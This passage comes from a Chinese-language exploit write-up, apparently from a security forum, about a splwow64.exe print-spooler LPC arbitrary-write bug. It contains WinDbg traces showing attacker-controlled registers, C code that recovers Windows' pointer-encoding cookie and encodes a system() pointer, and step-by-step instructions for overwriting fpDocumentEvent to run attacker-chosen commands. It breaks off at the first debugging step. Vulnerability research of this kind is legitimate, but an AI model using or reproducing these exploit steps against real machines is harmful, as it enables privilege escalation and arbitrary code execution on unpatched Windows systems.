
```text
1  2  3  4  5  6  7  8  9  10  11  12  13  14  15  16  17  18  19  20  21  22  23  24  25  26  27  28  29  30
0:007> gdi32full!GdiPrinterThunk+0x2ac:
00007ffac71a5c5c 488b0d85d51300 mov rcx,qword ptr [gdi32full!fpDocumentEvent (00007ffac72e31e8)] ds: 00007ffac72e31e8=7ec611be0000fff5
0:007> p
gdi32full!GdiPrinterThunk+0x2b3:
00007ffac71a5c63 48ff1536960a00 call qword ptr [gdi32full!_imp_RtlDecodePointer (00007ffac724f2a0)] ds: 00007ffac724f2a0={ntdll!RtlDecodePointer (00007ffac94477a0)}
0:007> p
gdi32full!GdiPrinterThunk+0x2ba:
00007ffac71a5c6a 0f1f440000 nop dword ptr [rax+rax]
0:007> ln rax
Browse module
Set bu breakpoint

(00007ffab1328f80) WINSPOOL!DocumentEvent | (00007ffab132939c) WINSPOOL!CallDrvDocumentEvent

Exact matches:
WINSPOOL!DocumentEvent (void)

0:007>
gdi32full!GdiPrinterThunk+0x1fd4a:
00007ffac71c56fa e834d5feff call gdi32full!memcpy (00007ffac71b2c33)
0:007> r
rax=0000000000d20800 rbx=0000000000d20160 rcx=4141414141414141
rdx=0000000000d20810 rsi=0000000000d20088 rdi=0000000000d785e0
rip=00007ffac71c56fa rsp=000000000279f210 rbp=000000000279f279
r8=0000000000000008 r9=0000000000000100 r10=00000fff5920c6c0
r11=000000000279f0e0 r12=0000000000000000 r13=0000000000000001
r14=0000000000000010 r15=0000000000000000
iopl=0 nv up ei ng nz ac po cy
cs=0033 ss=002b ds=002b es=002b fs=0053 gs=002b
efl=00000297
gdi32full!GdiPrinterThunk+0x1fd4a:
00007ffac71c56fa e834d5feff call gdi32full!memcpy (00007ffac71b2c33)
```

## 漏洞利用

通过上面对 POC 的分析，我们得到了如下信息：

1. 传入 `splwow64.exe` 进程的 LPC 消息，我们可以自由构造，所以我们可以控制程序流程每次都走到 `DocumentEvent` 函数。
2. 我们拥有一个任意地址写的原语。

参考[卡巴斯基](https://bbs.kanxue.com/elink@3f6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3g2D9K9i4y4@1i4K6u0W2j5$3!0E0i4K6u0r3L8%4m8W2M7X3q4@1K9h3!0F1i4K6u0V1M7r3!0%4k6i4u0X3j5h3I4D9i4K6u0V1M7r3!0%4k6i4u0X3j5h3I4D9i4K6u0V1x3U0l9J5x3q4)9J5k6o6l9&6z5o6k6Q4x3X3c8S2L8X3c8Q4x3X3c8$3j5i4u0A6j5h3&6@1M7#2)9J5c8U0V1^5x3K6t1&6i4K6u0r3)的分析文章，我们知道 `fpDocumentEvent` 函数指针是被编码过的值，且每一次编码得到的值都不同，这取决于当前的 Cookie 值。

```c
__int64 __fastcall RtlEncodePointer(__int64 a1)
{
    __int64 v1; // rax
    __int64 v2; // rbx
    unsigned int v4; // eax
    unsigned int v5; // [rsp+48h] [rbp+10h]

    v1 = (unsigned int)RtlpGetCookieValue::`2'::CookieValue;
    v2 = a1;
    if (!RtlpGetCookieValue::`2'::CookieValue)
    {
        v4 = NtQueryInformationProcess(-1i64, 36i64, &v5);
        if ((v4 & 0x80000000) != 0)
            RtlRaiseStatus(v4);

        v1 = v5;
        RtlpGetCookieValue::`2'::CookieValue = v5;
    }

    return __ROR8__(v2 ^ v1, v1 & 0x3F);
}
```

在 `splwow64.exe` 中，每一次执行 `DocumentEvent` 时，都先将 `fpDocumentEvent` 进行解码，从而得到原始的 `DocumentEvent` 函数指针，然后再进行调用，而 `fpDocumentEvent` 位于 `splwow64.exe` 进程的 `.data` 段，也就是说 `fpDocumentEvent` 指针的偏移是确定的。

同时我们知道一个事实，Windows 系统上的地址空间布局随机化是基于引导的，也就是说当系统启动后，系统 DLL 的基址就不会改变，直到下次重启系统，所以在 EXP 中通过手动加载 `gdi32full.dll`，就可以知道当前 `fpDocumentEvent` 指针的实际地址。

那么漏洞利用的思路就是，利用任意地址写的原语，将我们想要调用的函数指针，例如 `system` 函数指针，替换 `fpDocumentEvent` 函数指针。因为 `DocumentEvent` 函数在特定索引值的情况下，每次都会被调用，所以当我们替换成功后，实际调用的函数即为 `system`。

漏洞利用简述步骤：

1. 在调试环境下，确定 `fpDocumentEvent` 函数指针偏移，这里称为 `fpDocOffset`。
2. 在漏洞利用程序中，手动加载 `gdi32full.dll` 和 `winspool.drv`，分别获得 `gdi32full.dll` 的 `BaseAddress` 和 `DocumentEvent` 函数指针。
3. 发送 LPC 消息到 `splwow64.exe`，获得 `BaseAddress+fpDocOffset` 地址处的 `fpDocumentEvent` 函数指针。
4. 目前我们已经得到了 `fpDocumentEvent` 函数指针和 `DocumentEvent` 函数指针，也就是编码前后的函数指针，所以我们可以计算出编码所用的 Cookie 值，计算公式如下。（源自 @iamelli0t 师傅在看雪 SDC 的演讲 PPT）

```c
UINT64 CalcCookie(UINT64 encodePtr, UINT64 decodePtr)
{
    UINT cookie = 0;
    for (UINT i = 0; i <= 0x3f; i++)
    {
        cookie = (UINT)decodePtr ^ __ROL8__(encodePtr, i & 0x3F);
        if ((cookie & 0x3f) == i &&
            __ROR8__(decodePtr ^ cookie, cookie & 0x3f) == encodePtr)
        {
            break;
        }
    }
    return cookie;
}
```

5. 通过第四步得到的 Cookie 值，编码 `system` 函数指针，这里我们称编码后的值为 `fpSystem`，编码公式如下。（源自[卡巴斯基](https://bbs.kanxue.com/elink@655K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6k6h3y4#2M7X3g2D9K9i4y4@1i4K6u0W2j5$3!0E0i4K6u0r3L8%4m8W2M7X3q4@1K9h3!0F1i4K6u0V1M7r3!0%4k6i4u0X3j5h3I4D9i4K6u0V1M7r3!0%4k6i4u0X3j5h3I4D9i4K6u0V1x3U0l9J5x3q4)9J5k6o6l9&6z5o6k6Q4x3X3c8S2L8X3c8Q4x3X3c8$3j5i4u0A6j5h3&6@1M7#2)9J5c8U0V1^5x3K6t1&6i4K6u0r3)博客）：

```c
UINT64 encodePtr = __ROR8__(cookie ^ (UINT64)systemAdd, cookie & 0x3f);
```

6. 继续发送 LPC 消息，通过共享内存，将 `fpSystem` 函数指针填充到 `BaseAddress+fpDocOffset` 地址处。
7. 最后再发送一次特定索引值的 LPC 消息，同时在 LPC 消息中包含 `system` 函数的参数。

下面我们通过调试看看具体的流程。

1. 从 `splwow64.exe` 进程空间获取 `fpDocumentEvent` 函数指针到共享内存。
